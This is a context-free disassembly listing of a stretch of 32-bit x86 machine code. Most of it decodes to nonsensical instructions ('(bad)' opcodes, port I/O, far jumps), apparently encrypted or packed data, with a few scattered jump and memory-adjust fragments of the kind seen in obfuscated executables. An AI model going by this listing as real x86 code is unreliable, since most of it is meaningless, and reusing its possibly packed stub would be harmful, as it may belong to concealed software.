  402105:	sbb    BYTE PTR [edx+0x6b],0x5f
  402109:	in     al,0x22
  40210b:	and    al,ah
  40210d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40210e:	mov    BYTE PTR [ebx-0x6ea7868e],bh
  402114:	ins    BYTE PTR es:[edi],dx
  402115:	adc    DWORD PTR [esp+ebx*8+0x28],esi
  402119:	aad    0xc
  40211b:	push   ebp
  40211c:	(bad)  
  40211d:	bound  esi,QWORD PTR [edi+0x5c]
  402120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402121:	dec    ecx
  402122:	mov    gs,WORD PTR [esi+ecx*2+0x395958da]
  402129:	xchg   esp,eax
  40212a:	inc    edx
  40212b:	ret    
  40212c:	sub    edi,DWORD PTR [eax+0x67]
  40212f:	data16 aam 0x96
  402132:	mov    esp,0x32ed178b
  402137:	push   ss
  402138:	sbb    bl,BYTE PTR ds:0x831803d4
  40213e:	jge    0x402184
  402140:	pop    edx
  402141:	pop    ss
  402142:	sti    
  402143:	fild   DWORD PTR [ecx+esi*2-0x20356502]
  40214a:	xchg   edx,eax
  40214b:	lahf   
  40214c:	dec    ecx
  40214d:	jge    0x4021a4
  40214f:	retf   0x56e4
  402152:	dec    eax
  402153:	out    0xeb,al
  402155:	mov    ds:0x9ce613de,eax
  40215a:	in     al,dx
  40215b:	cmp    ch,BYTE PTR [ebx+0x58]
  40215e:	push   esi
  40215f:	ins    BYTE PTR es:[edi],dx
  402160:	xchg   edi,eax
  402161:	inc    esi
  402162:	cmp    dh,ch
  402164:	stos   DWORD PTR es:[edi],eax
  402165:	push   ecx
  402166:	or     DWORD PTR [ebp+0xb85be98],edi
  40216c:	or     DWORD PTR [edx-0x46],eax
  40216f:	fucom  st(1)
  402171:	rcl    BYTE PTR [eax],cl
  402173:	std    
  402174:	outs   dx,BYTE PTR ds:[esi]
  402175:	add    dh,BYTE PTR [edi]
  402177:	out    dx,al
  402178:	and    BYTE PTR [ecx+ebp*4+0x32],bh
  40217c:	jle    0x4021e7
  40217e:	cs daa 
  402180:	lods   al,BYTE PTR ds:[esi]
  402181:	stos   DWORD PTR es:[edi],eax
  402182:	and    DWORD PTR [ebp+0x50],0xffffff86
  402186:	shl    BYTE PTR [edi-0xdd2e314],cl
  40218c:	or     al,BYTE PTR [ebx]
  40218e:	sub    eax,0xb0d5e2b
  402193:	retf   
  402194:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40219b:	mov    edx,DWORD PTR ds:0x434449
  4021a1:	mov    edx,DWORD PTR [edx]
  4021a3:	sbb    DWORD PTR ds:0x4326f0,edx
  4021a9:	jmp    0x40255f
  4021ae:	in     eax,0xd
  4021b0:	lock or al,0x68
  4021b3:	mov    DWORD PTR [ecx-0xf],esi
  4021b6:	push   ecx
  4021b7:	scas   al,BYTE PTR es:[edi]
  4021b8:	int3   
  4021b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021ba:	icebp  
  4021bb:	bound  ebx,QWORD PTR ds:0x700452f0
  4021c1:	jo     0x40215a
  4021c3:	jge    0x402235
  4021c5:	jo     0x4021de
  4021c7:	pop    esi
  4021c8:	push   ebx
  4021c9:	into   
  4021ca:	xchg   edi,eax
  4021cb:	test   eax,0x293b4eac
  4021d0:	push   0xffffffe5
  4021d2:	dec    eax
  4021d3:	mov    DWORD PTR [ebx],0x53f4603c
  4021d9:	out    0x64,eax
  4021db:	mov    ecx,0xed904144
  4021e0:	out    0xf5,al
  4021e2:	cli    
  4021e3:	(bad)  
  4021e4:	call   0x8c28a726
  4021e9:	sub    BYTE PTR [edi+0x432598cc],dh
  4021ef:	cmp    ah,BYTE PTR [ebp-0x56]
  4021f2:	fcomp  DWORD PTR [esi+ecx*8+0x5d624fa4]
  4021f9:	adc    dh,BYTE PTR [eax-0x1f]
  4021fc:	jae    0x402189
  4021fe:	outs   dx,BYTE PTR ds:[esi]
  4021ff:	and    dh,BYTE PTR [ebp+0x32]
  402202:	repz popf 
  402204:	fimul  WORD PTR [ecx]
  402206:	fnstcw WORD PTR [edi+0x4cd578f3]
  40220c:	mov    eax,0xa1ca0c59
  402211:	cli    
  402212:	gs jge 0x402198
  402215:	jne    0x4021a4
  402217:	repnz push ebx
  402219:	jmp    0x3b5:0x145f9989
  402220:	and    bl,BYTE PTR [eax]
  402222:	pop    edx
  402223:	shr    BYTE PTR [edi+0x1],cl
  402226:	fs lock push 0x74faa446
  40222d:	dec    esi
  40222e:	pushf  
  40222f:	pop    ss
  402230:	clc    
  402231:	inc    esp
  402232:	mov    bl,BYTE PTR [ebx+0x6d78927e]
  402238:	out    0x83,eax
  40223a:	xchg   ebx,eax
  40223b:	scas   al,BYTE PTR es:[edi]
  40223c:	mov    eax,ds:0x1f60b542
  402241:	xor    eax,0xa120ff87
  402246:	test   BYTE PTR [eax],0xd6
  402249:	sub    dl,BYTE PTR [ebx+eiz*4-0x7a]
  40224d:	scas   eax,DWORD PTR es:[edi]
  40224e:	sub    al,0xda
  402250:	mov    esp,0xdf9ca945
  402255:	mov    ds:0xc5cf05d4,eax
  40225a:	lods   eax,DWORD PTR ds:[esi]
  40225b:	nop
  40225c:	aaa    
  40225d:	cmc    
  40225e:	mov    ah,0x9b
  402260:	ret    
  402261:	stos   DWORD PTR es:[edi],eax
  402262:	cmc    
  402263:	fisubr WORD PTR [ecx-0x5f96851f]
  402269:	cwde   
  40226a:	push   ebp
  40226b:	cli    
  40226c:	dec    ebx
  40226d:	pop    eax
  40226e:	and    ah,BYTE PTR cs:[esi-0x6abb2649]
  402275:	jbe    0x4021f8
  402277:	add    eax,0x2e8908e4
  40227c:	or     bl,bh
  40227e:	pop    esp
  40227f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402280:	icebp  
  402281:	fsub   st(1),st
  402283:	cli    
  402284:	imul   edx,DWORD PTR [ebp+0x7f0cb30],0x8eee23bd
  40228e:	sbb    cl,ch
  402290:	dec    eax
  402291:	in     al,dx
  402292:	outs   dx,DWORD PTR ds:[esi]
  402293:	dec    ebx
  402294:	add    BYTE PTR [eax+0x59],cl
  402297:	rol    DWORD PTR [edi],cl
  402299:	xor    ebx,DWORD PTR [ecx-0x1e]
  40229c:	mov    dl,0x3a
  40229e:	dec    esi
  40229f:	mov    edx,0x84d2b246
  4022a4:	(bad)  
  4022a5:	mov    bl,0xe
  4022a7:	pop    ds
  4022a8:	popf   
  4022a9:	imul   ebp,DWORD PTR [ecx],0x7db52612
  4022af:	mov    ds:0x2880133b,eax
  4022b4:	jmp    0x4022b9
  4022b6:	into   
  4022b7:	lahf   
  4022b8:	push   ecx
  4022b9:	pusha  
  4022ba:	mov    ecx,db0
  4022bd:	xchg   edx,eax
  4022be:	adc    dl,BYTE PTR [ebp-0x36350046]
  4022c4:	out    dx,al
  4022c5:	fsubr  DWORD PTR ds:0xb47c569a
  4022cb:	or     esi,DWORD PTR [esi+0x4913d8e4]
  4022d1:	out    dx,eax
  4022d2:	or     ch,BYTE PTR [esi-0x31d99d33]
  4022d8:	inc    edi
  4022d9:	(bad)  
  4022da:	jmp    0x8f60:0x8839f0d8
  4022e1:	push   ebp
  4022e2:	add    al,0x4e
  4022e4:	fnsave [ebp-0x2a6ca08c]
  4022ea:	dec    ebp
  4022eb:	pop    esi
  4022ec:	sub    DWORD PTR [ebx+0x38241e96],ecx
  4022f2:	pop    DWORD PTR [esi-0x53d6c20]
  4022f8:	pop    es
  4022f9:	enter  0xf34b,0x50
  4022fd:	mov    ebx,0x56a5bc7c
  402302:	int3   
  402303:	mov    ds,WORD PTR [ebx]
  402305:	mov    edx,0x97f3edfc
  40230a:	data16 fsubr DWORD PTR [eax]
  40230d:	xchg   ebp,eax
  40230e:	repnz and al,0xd9
  402311:	or     BYTE PTR [ecx+0x7e],0xc8
  402315:	std    
  402316:	pushf  
  402317:	in     eax,0x4e
  402319:	mov    ecx,0x103513b5
  40231e:	and    eax,0x9b15a38e
  402323:	dec    ebp
  402324:	xchg   esp,eax
  402325:	enter  0x6046,0xcc
  402329:	fidiv  DWORD PTR ds:0x77ee2eb0
  40232f:	lock aas 
  402331:	shl    BYTE PTR [edi+0x52],1
  402334:	or     BYTE PTR [edi+0xc],al
  402337:	cdq    
  402338:	inc    ebp
  402339:	lods   al,BYTE PTR ds:[esi]
  40233a:	inc    DWORD PTR [eax+0x491473c2]
  402340:	aad    0xb2
  402342:	pop    eax
  402343:	pop    edi
  402344:	ret    
  402345:	retf   
  402346:	shl    edi,0xe8
  402349:	add    ch,bl
  40234b:	push   0x1b
  40234d:	stc    
  40234e:	test   eax,0x8fab5df2
  402353:	mov    dh,0xb7
  402355:	stos   BYTE PTR es:[edi],al
  402356:	int    0xd9
  402358:	jecxz  0x402306
  40235a:	daa    
  40235b:	ror    BYTE PTR [edi],1
  40235d:	cmc    
  40235e:	mov    ds:0xb21d8e9a,eax
  402363:	xchg   BYTE PTR [ebp-0x636fee2a],ch
  402369:	lahf   
  40236a:	xor    al,0x17
  40236c:	sub    al,0x7f
  40236e:	aam    0xa3
  402370:	mov    ebp,0xdf6892d
  402375:	mov    esi,0x32de9167
  40237a:	xchg   ebp,eax
  40237b:	push   eax
  40237c:	sub    eax,0xb5a4f2f1
  402381:	test   al,0x79
  402383:	cmp    bh,BYTE PTR [ebx-0x2c]
  402386:	pop    esi
  402387:	xchg   ebx,eax
  402388:	mov    ebp,esp
  40238a:	in     eax,dx
  40238b:	mov    esi,0xeda25a0b
  402390:	frstor [eax]
  402392:	mov    cl,0xc2
  402394:	dec    ebx
  402395:	fcom   DWORD PTR [ebx+0x2c70719a]
  40239b:	xchg   esi,eax
  40239c:	jmp    0x402395
  40239e:	daa    
  40239f:	adc    BYTE PTR [ebx],al
  4023a1:	cmp    al,0x51
  4023a3:	pushf  
  4023a4:	sub    eax,0x23b09039
  4023a9:	in     eax,0xdc
  4023ab:	xor    bl,bh
  4023ad:	push   ebp
  4023ae:	scas   eax,DWORD PTR es:[edi]
  4023af:	adc    DWORD PTR [edi+0x75],0x6d
  4023b3:	sub    al,0x6a
  4023b5:	mov    dh,0x2e
  4023b7:	out    0xb2,al
  4023b9:	sbb    eax,0x8654e26e
  4023be:	mov    ?,WORD PTR [edi+0x4cc94b06]
  4023c4:	inc    ebx
  4023c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023c6:	fsubr  st,st(1)
  4023c8:	fistp  DWORD PTR [edx+0x58fb2959]
  4023ce:	mov    ch,0xd2
  4023d0:	mov    ebx,ebx
  4023d2:	sbb    al,0x1e
  4023d4:	sbb    ah,BYTE PTR [eax+0x62]
  4023d7:	or     al,ch
  4023d9:	sbb    al,0xa3
  4023db:	inc    DWORD PTR [ebx+0x2a2726c5]
  4023e1:	mov    ds:0x15f6ffb8,eax
  4023e6:	retf   
  4023e7:	rcl    DWORD PTR [edx+0x10d13be6],0xf0
  4023ee:	push   ecx
  4023ef:	and    bh,ch
  4023f1:	daa    
  4023f2:	adc    DWORD PTR [eax-0x5c],eax
  4023f5:	aam    0x36
  4023f7:	ds mov dh,ch
  4023fa:	and    bl,0x19
  4023fd:	jo     0x40239c
  4023ff:	push   0xea0e9412
  402404:	inc    ebp
  402405:	cld    
  402406:	fisttp QWORD PTR [edi]
  402408:	sti    
  402409:	pushf  
  40240a:	(bad)  
  40240b:	and    eax,0xd1db4346
  402410:	shl    DWORD PTR [esi],cl
  402412:	out    dx,eax
  402413:	xchg   DWORD PTR [ebx],eax
  402415:	test   BYTE PTR [eax],0xaa
  402418:	xchg   ecx,eax
  402419:	outs   dx,DWORD PTR ds:[esi]
  40241a:	daa    
  40241b:	scas   al,BYTE PTR es:[edi]
  40241c:	or     DWORD PTR [ecx+0x42],0x1c62de87
  402423:	xchg   esi,eax
  402424:	push   ebx
  402425:	(bad)  
  402426:	jg     0x402476
  402428:	sub    DWORD PTR [edi],ecx
  40242a:	and    dh,BYTE PTR [edx-0x2e]
  40242d:	fs call 0x368f:0xa8fac240
  402435:	jns    0x40242c
  402437:	adc    al,0xaf
  402439:	jne    0x4023fa
  40243b:	sub    esi,DWORD PTR [ebx+edi*8-0x77]
  40243f:	loope  0x402455
  402441:	(bad)
  402444:	or     dh,BYTE PTR [edx+ebx*1-0x1a]
  402448:	test   DWORD PTR [ebx],ebp
  40244a:	frstor [ecx+0x2390d30]
  402450:	icebp  
  402451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402452:	lock test eax,0x52cff5f
  402458:	clc    
  402459:	gs xchg edx,eax
  40245b:	push   esp
  40245c:	stc    
  40245d:	test   DWORD PTR [ebp+0x39],esi
  402460:	push   cs
  402461:	enter  0x5eff,0x60
  402465:	xchg   DWORD PTR [ebx],ebp
  402467:	shl    BYTE PTR [edx-0x12],cl
  40246a:	mov    ah,0xbd
  40246c:	xchg   edi,edx
  40246e:	sahf   
  40246f:	test   cl,bl
  402471:	adc    BYTE PTR [edi],dl
  402473:	and    bh,bh
  402475:	pop    edi
  402476:	test   eax,0x43395e56
  40247b:	sahf   
  40247c:	ja     0x402484
  40247e:	stos   BYTE PTR es:[edi],al
  40247f:	or     al,0xfa
  402481:	ret    
  402482:	inc    eax
  402483:	in     al,0x29
  402485:	jno    0x4024d8
  402487:	jl     0x40249e
  402489:	(bad)  
  40248a:	cli    
  40248b:	xchg   ebx,eax
  40248c:	add    eax,0xa3e38f39
  402491:	sbb    DWORD PTR [ebp-0x7aa3a0b0],eax
  402497:	dec    ecx
  402498:	bound  edi,QWORD PTR [eax-0x19b3d8c0]
  40249e:	and    DWORD PTR ds:0x553d27f5,0xb9a59318
  4024a8:	and    BYTE PTR [ebp-0x2c],0xdc
  4024ac:	push   ecx
  4024ad:	shr    ah,cl
  4024af:	pop    esi
  4024b0:	scas   al,BYTE PTR es:[edi]
  4024b1:	dec    eax
  4024b2:	jle    0x402476
  4024b4:	dec    edi
  4024b5:	call   0xdfec:0xaf3db584
  4024bc:	in     eax,0x5f
  4024be:	jae    0x4024ee
  4024c0:	jbe    0x4024d1
  4024c2:	mov    esi,0xb14d0289
  4024c7:	inc    ebx
  4024c8:	aad    0x82
  4024ca:	jge    0x4024a1
  4024cc:	int    0xd3
  4024ce:	xchg   esp,eax
  4024cf:	cmp    ch,BYTE PTR [edx+0x22]
  4024d2:	mov    esp,DWORD PTR [eax+0x227c56e5]
  4024d8:	push   eax
  4024d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024da:	adc    al,0xb5
  4024dc:	jnp    0x40254f
  4024de:	pop    es
  4024df:	outs   dx,DWORD PTR ds:[esi]
  4024e0:	(bad)  
  4024e1:	hlt    
  4024e2:	into   
  4024e3:	mov    es,WORD PTR [ebx]
  4024e5:	scas   al,BYTE PTR es:[edi]
  4024e6:	frstor [ebp-0x772cf4c1]
  4024ec:	std    
  4024ed:	fsub   DWORD PTR [esi-0x78]
  4024f0:	sbb    eax,0xa5ff3181
  4024f5:	enter  0xc232,0x28
  4024f9:	dec    esp
  4024fa:	es jp  0x40250c
  4024fd:	cld    
  4024fe:	pop    eax
  4024ff:	out    0x22,al
  402501:	ficomp WORD PTR [eax-0x4e8a5c0d]
  402507:	ret    0xa4b8
  40250a:	add    ebp,DWORD PTR [esi+0x17]
  40250d:	lahf   
  40250e:	or     DWORD PTR [eax-0x3629e4f8],edi
  402514:	sub    ah,BYTE PTR [edx]
  402516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402517:	idiv   ch
  402519:	mov    ebp,DWORD PTR [esp+ecx*1-0x68]
  40251d:	sbb    al,0x64
  40251f:	jnp    0x402518
  402521:	or     ch,ch
  402523:	mov    eax,ds:0x3b0f94ca
  402528:	pop    DWORD PTR [ebp+0x51abfa7f]
  40252e:	fisubr WORD PTR [ebx-0x1313cfe5]
  402534:	les    edx,FWORD PTR [eax+0x7543cc9b]
  40253a:	xor    DWORD PTR [edx],edi
  40253c:	mov    bh,BYTE PTR [edi]
  40253e:	inc    eax
  40253f:	rol    BYTE PTR [ebx+0x35],cl
  402542:	out    0xf5,al
  402544:	dec    esi
  402545:	ret    0x91c6
  402548:	fidivr WORD PTR [eax+0x3def8442]
  40254e:	xor    eax,0x650739b7
  402553:	sub    edx,DWORD PTR [ebp+ebx*2+0x1f3f64bf]
  40255a:	xchg   edi,eax
  40255b:	repz mov ebx,0x558b52d8
  402561:	clc    
  402562:	sub    ecx,0x6fb0
  402568:	push   esi
  402569:	add    DWORD PTR ds:0x4326f0,ecx
  40256f:	mov    ecx,0x7510855
  402574:	xor    edx,ecx
  402576:	and    esi,0x4f5d
  40257c:	mov    esi,0x32729c
  402581:	push   edi
  402582:	mov    edi,DWORD PTR [ebp+0x10]
  402585:	add    DWORD PTR ds:0x432dd2,0x4326f0
  40258f:	add    edx,esi
  402591:	jmp    0x402947
  402596:	mov    ah,0x31
  402598:	cdq    
  402599:	or     ebx,DWORD PTR [ecx+0x8b1b293]
  40259f:	or     dl,BYTE PTR [ebp+0x24]
  4025a2:	mov    al,0xe3
  4025a4:	ds test al,0xe9
  4025a7:	add    BYTE PTR [eax+0x70],dh
  4025aa:	xchg   edi,eax
  4025ab:	jge    0x40261d
  4025ad:	jo     0x4025fe
  4025af:	stos   BYTE PTR es:[edi],al
  4025b0:	in     al,0x28
  4025b2:	nop
  4025b3:	fs cli 
  4025b5:	push   ecx
  4025b6:	pop    ebp
  4025b7:	jle    0x4025fb
  4025b9:	add    al,0x1e
  4025bb:	or     BYTE PTR [ebp-0x2b],cl
  4025be:	repz cdq 
  4025c0:	cmp    ecx,DWORD PTR [ebp-0x6b5aba39]
  4025c6:	fnstsw WORD PTR [si+0x68cf]
  4025cb:	add    DWORD PTR [ebp-0x6d4ea22d],ebx
  4025d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025d2:	xchg   BYTE PTR [ebx+0x43],dl
  4025d5:	add    dh,BYTE PTR [ecx-0x8]
  4025d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025d9:	add    bh,al
  4025db:	sub    al,BYTE PTR [esi+ebp*4-0x53]
  4025df:	xchg   ebp,eax
  4025e0:	out    0x2b,eax
  4025e2:	loopne 0x402630
  4025e4:	loop   0x40264e
  4025e6:	mov    ah,0x26
  4025e8:	stc    
  4025e9:	in     al,dx
  4025ea:	or     al,0xb8
  4025ec:	call   0xab8cc80b
  4025f1:	push   edi
  4025f2:	or     eax,0x2820bb9f
  4025f7:	or     DWORD PTR [edi-0xf],0x3a
  4025fb:	bound  ebx,QWORD PTR [edi+0x2a]
  4025fe:	sub    eax,0xfe78b9f8
  402603:	aam    0x2d
  402605:	aaa    
  402606:	daa    
  402607:	push   ebp
  402608:	xchg   esp,eax
  402609:	mov    dh,0x36
  40260b:	int3   
  40260c:	xchg   esi,eax
  40260d:	mov    cl,0xec
  40260f:	imul   eax,esi,0xd5a1e03e
  402615:	jp     0x40261c
  402617:	inc    esi
  402618:	adc    edi,DWORD PTR [ebx+0x6a5de931]
  40261e:	int    0xcc
  402620:	jle    0x4025fb
  402622:	or     DWORD PTR [edi+edx*8],edx
  402625:	xor    edx,ecx
  402627:	pop    ecx
  402628:	and    ebx,ecx
  40262a:	lahf   
  40262b:	push   edx
  40262c:	pop    es
  40262d:	(bad)  
  40262e:	jl     0x402655
  402630:	sbb    dh,bl
  402632:	inc    edx
  402633:	call   0x437b:0xbde2bf1e
  40263a:	out    0x58,eax
  40263c:	jmp    0xa4ad:0x65020256
  402643:	in     al,dx
  402644:	push   ds
  402645:	jnp    0x40262b
  402647:	pop    ebp
  402648:	cmp    BYTE PTR [esi],0xae
  40264b:	sbb    BYTE PTR [edi],dl
  40264d:	mov    ebp,0x44ee75ec
  402652:	loop   0x402693
  402654:	daa    
  402655:	or     DWORD PTR [edi+0x4710357c],esi
  40265b:	mov    ds:0xe94d63e1,eax
  402660:	inc    edi
  402661:	(bad)  
  402662:	and    al,0x97
  402664:	ss ret 0xd41a
  402668:	mov    edi,0x631d8636
  40266d:	ins    BYTE PTR es:[edi],dx
  40266e:	jnp    0x40263e
  402670:	cmp    DWORD PTR [eax+0x4a1bd0da],0xffffffc3
  402677:	int    0x44
  402679:	in     al,0x76
  40267b:	fsubr  QWORD PTR [edi+edi*8+0x391c9dd]
  402682:	(bad)  
  402683:	push   0x5
  402685:	push   esi
  402686:	repz sbb eax,DWORD PTR [edx]
  402689:	(bad)  
  40268a:	fild   WORD PTR [eax]
  40268c:	jg     0x4026fc
  40268e:	cmp    edi,esp
  402690:	inc    edx
  402691:	xor    ebp,DWORD PTR [ebx]
  402693:	jbe    0x40270b
  402695:	addr16 hlt 
  402697:	sbb    bl,0xc7
  40269a:	add    eax,0xd1f0fdaf
  40269f:	mov    bl,0xd5
  4026a1:	cmp    al,0xd1
  4026a3:	mov    ds,WORD PTR [ebp-0x3039b6dc]
  4026a9:	dec    ecx
  4026aa:	push   ebp
  4026ab:	jecxz  0x4026d3
  4026ad:	iret   
  4026ae:	xchg   esp,eax
  4026af:	pop    ds
  4026b0:	popa   
  4026b1:	fwait
  4026b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026b3:	push   ds
  4026b4:	out    dx,eax
  4026b5:	xlat   BYTE PTR ds:[ebx]
  4026b6:	cli    
  4026b7:	je     0x4026fb
  4026b9:	push   ds
  4026ba:	es mov ebp,0x33f89aed
  4026c0:	nop
  4026c1:	pop    ebx
  4026c2:	fstp   QWORD PTR [esi-0x30b02f1]
  4026c8:	adc    eax,0x64
  4026cb:	lahf   
  4026cc:	test   al,0x7
  4026ce:	xchg   esi,eax
  4026cf:	or     ch,BYTE PTR [esp+edx*4-0x3b]
  4026d3:	mov    ebp,0x13a6fe04
  4026d8:	ds daa 
  4026da:	xor    DWORD PTR [esi-0x5939358b],ebp
  4026e0:	sub    al,0xec
  4026e2:	stos   BYTE PTR es:[edi],al
  4026e3:	inc    esi
  4026e4:	mov    dl,0x7d
  4026e6:	mov    bl,0xff
  4026e8:	xor    ebp,ebx
  4026ea:	and    DWORD PTR [esi-0x5cc35efb],esp
  4026f0:	xor    esp,eax
  4026f2:	fsubp  st(6),st
  4026f4:	iret   
  4026f5:	pop    ecx
  4026f6:	xor    al,ch
  4026f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026f9:	outs   dx,DWORD PTR ds:[esi]
  4026fa:	lds    edx,FWORD PTR ds:0x617224eb
  402700:	adc    cl,BYTE PTR [edi+0x2d]
  402703:	dec    esi
  402704:	add    edi,esi
  402706:	lea    edi,[edi]
  402708:	ja     0x4026a1
  40270a:	in     eax,dx
  40270b:	mov    esi,0x3e4c90f8
  402710:	leave  
  402711:	pop    ebp
  402712:	sbb    DWORD PTR [edx+0x5b],esp
  402715:	cmp    BYTE PTR [esi],dh
  402717:	mov    ecx,0xf0892ff0
  40271c:	sar    bh,cl
  40271e:	sub    dl,BYTE PTR [esi+0x5a]
  402721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402722:	bnd ss fs jno 0x40272e
  402727:	and    BYTE PTR [ebp-0x38b4bec7],bl
  40272d:	sub    DWORD PTR [ecx-0x5c],ebx
  402730:	stos   DWORD PTR es:[di],eax
  402732:	jb     0x4026d9
  402734:	rcl    BYTE PTR [ebx],cl
  402736:	imul   edi,edi,0xffffff9f
  402739:	jge    0x402782
  40273b:	push   ebx
  40273c:	push   ecx
  40273d:	pop    ebx
  40273e:	fcomp  QWORD PTR [edx+0x278a5d4d]
  402744:	cmp    esp,DWORD PTR [ebp+0x66]
  402747:	rcr    dh,0xad
  40274a:	sahf   
  40274b:	aad    0x9e
  40274d:	pop    ss
  40274e:	jno    0x40271f
  402750:	xor    eax,0x14ab0630
  402755:	inc    ecx
  402756:	inc    esp
  402757:	mov    esi,es
  402759:	and    ebp,DWORD PTR [esi]
  40275b:	dec    eax
  40275c:	loope  0x4026f8
  40275e:	sahf   
  40275f:	add    al,0x88
  402761:	sbb    dl,BYTE PTR [eax+0x2c]
  402764:	mov    BYTE PTR es:[ebp+0x2e7a4b33],dl
  40276b:	sar    edx,0x78
  40276e:	dec    ecx
  40276f:	loopne 0x402719
  402771:	inc    ebp
  402773:	jae    0x402727
  402775:	das    
  402776:	ins    BYTE PTR es:[edi],dx
  402777:	and    eax,0x63182e15
  40277c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40277d:	cmp    ch,ah
  40277f:	imul   ebx,edi,0xfffffff0
  402782:	mov    bl,0x83
  402784:	or     edi,edx
  402786:	fdiv   QWORD PTR [eax]
  402788:	loopne 0x402757
  40278a:	outs   dx,DWORD PTR ds:[esi]
  40278b:	jp     0x4027a2
  40278d:	gs jg  0x40277e
  402790:	mov    ds:0x55d0a9ab,al
  402795:	popa   
  402796:	mov    ah,0xe6
  402798:	mov    edi,0x93bb03d
  40279d:	test   dl,ah
  40279f:	dec    edx
  4027a0:	ja     0x4027ad
  4027a2:	xchg   edi,eax
  4027a3:	add    esi,eax
  4027a5:	lds    ebx,FWORD PTR [ecx+0xebed2a6]
  4027ab:	fcom   DWORD PTR [edi+0x1e14a1dc]
  4027b1:	test   al,0x48
  4027b3:	jge    0x4027a1
  4027b5:	addr16 xor al,0x60
  4027b8:	cdq    
  4027b9:	rol    DWORD PTR [esi+esi*1-0x59f8df2e],0xe1
  4027c1:	(bad)  [edx-0x5d]
  4027c4:	ror    DWORD PTR [edi-0x64a068ca],0x8b
  4027cb:	jmp    0x40279d
  4027cd:	xchg   ecx,eax
  4027ce:	in     al,dx
  4027cf:	in     al,0xb6
  4027d1:	add    al,0x84
  4027d3:	fistp  DWORD PTR [edx+0x51]
  4027d6:	fcomp  QWORD PTR [eax]
  4027d8:	test   eax,0x921b91a2
  4027dd:	test   eax,0x60bc4615
  4027e2:	xchg   ebp,eax
  4027e3:	sbb    edi,DWORD PTR [edx]
  4027e5:	pop    eax
  4027e6:	repz xor dl,dl
  4027e9:	aaa    
  4027ea:	(bad)  
  4027eb:	pop    ds
  4027ec:	div    ecx
  4027ee:	mov    bh,BYTE PTR ds:0x6746038e
  4027f4:	xchg   esp,eax
  4027f5:	dec    esp
  4027f6:	out    dx,al
  4027f7:	mov    edx,0xed5cf2ea
  4027fc:	dec    edi
  4027fd:	adc    ah,0xd4
  402800:	out    dx,eax
  402801:	dec    eax
  402802:	inc    esp
  402803:	fld    DWORD PTR [ebp-0x6a]
  402806:	xchg   ebp,eax
  402807:	sbb    al,BYTE PTR [edi+0x28fcc0d1]
  40280d:	aad    0x2f
  40280f:	in     eax,0x4e
  402811:	and    esi,edx
  402813:	cwde   
  402814:	add    WORD PTR ds:0x44752611,0xffaf
  40281c:	inc    edx
  40281d:	jp     0x40285c
  40281f:	ror    BYTE PTR [esi],0xb8
  402822:	mov    ch,0x57
  402824:	mov    ebx,0x18d423f0
  402829:	mov    bl,0x83
  40282b:	(bad)  
  40282e:	sub    ch,BYTE PTR [ebx+edx*2+0x11]
  402832:	pop    edx
  402833:	loopne 0x402881
  402835:	add    eax,DWORD PTR [edi-0x2a7663d9]
  40283b:	xchg   ecx,eax
  40283c:	jne    0x402835
  40283e:	pop    ebx
  40283f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402841:	(bad)  [eax]
  402843:	push   ecx
  402844:	aas    
  402845:	pop    edi
  402846:	hlt    
  402847:	jecxz  0x402801
  402849:	sbb    BYTE PTR [eax-0x9],ah
  40284c:	mov    ds:0xfa92f1a5,eax
  402851:	idiv   BYTE PTR [esi]
  402853:	mov    edx,0xd6852044
  402858:	inc    ecx
  402859:	in     al,0x55
  40285b:	mov    DWORD PTR [ecx-0x1c],edx
  40285e:	shl    DWORD PTR [edx],cl
  402860:	pop    ebx
  402861:	pop    ecx
  402862:	add    dl,BYTE PTR [eax]
  402864:	dec    ebp
  402865:	fcom   DWORD PTR [ecx]
  402867:	xor    edi,esi
  402869:	pop    ecx
  40286a:	loopne 0x402853
  40286c:	fisubr DWORD PTR [edx+0x79]
  40286f:	jo     0x40289f
  402871:	adc    ah,BYTE PTR [eax-0x31]
  402874:	das    
  402875:	mov    bh,0x58
  402877:	mov    WORD PTR [edx+0x1c98202f],?
  40287d:	les    esi,FWORD PTR fs:[ebp-0x7c9af8e]
  402884:	mov    dl,0x5d
  402886:	ficom  DWORD PTR [ecx+ebx*4]
  402889:	outs   dx,BYTE PTR ds:[esi]
  40288a:	stos   DWORD PTR es:[edi],eax
  40288b:	test   BYTE PTR [eax+ebp*1-0x9],al
  40288f:	jae    0x402907
  402891:	jae    0x40282c
  402893:	or     DWORD PTR [ecx+0x2b50805a],0x61753b52
  40289d:	fisubr WORD PTR [ebx+0x13]
  4028a0:	imul   ebx,DWORD PTR [ecx],0xffffffca
  4028a3:	jge    0x402888
  4028a5:	sub    eax,0x8f9cbffd
  4028aa:	mov    edi,0x3bb08ae4
  4028af:	cdq    
  4028b0:	mov    ecx,0x8fefb487
  4028b5:	jecxz  0x40285a
  4028b7:	stc    
  4028b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028b9:	xor    eax,0xdf51f927
  4028be:	add    DWORD PTR [ebp+0x4a],0xa7d9f1a0
  4028c5:	mov    ecx,0xd574a986
  4028ca:	xchg   ecx,eax
  4028cb:	xchg   ebx,eax
  4028cc:	(bad)  
  4028cd:	in     al,dx
  4028ce:	arpl   WORD PTR fs:[esi-0x78],ax
  4028d2:	mov    esi,0x4c58f242
  4028d7:	adc    ah,BYTE PTR [eax]
  4028d9:	cmp    eax,0xa11bb925
  4028de:	dec    esp
  4028df:	into   
  4028e0:	pop    edx
  4028e1:	cdq    
  4028e2:	xchg   ebx,eax
